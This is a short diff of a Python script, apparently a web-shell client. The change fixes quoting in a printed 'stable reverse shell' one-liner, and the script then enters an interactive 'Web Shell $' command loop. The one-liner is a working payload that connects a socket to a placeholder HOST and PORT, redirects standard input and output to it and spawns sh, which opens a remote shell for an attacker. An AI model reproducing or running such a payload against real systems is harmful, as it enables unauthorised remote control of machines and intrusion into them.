@@ -12,7 +12,7 @@ import sys
 
 print('')
 print('To create a stable reverse shell use:')
-print('python3 -c "import os,pty,socket;s=socket.socket();s.connect((\"HOST\",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")"')
+print('python3 -c "import os,pty,socket;s=socket.socket();s.connect((\'HOST\',PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\'sh\')"')
 print('')
 while True:
     cmd = str(input('Web Shell $ '))
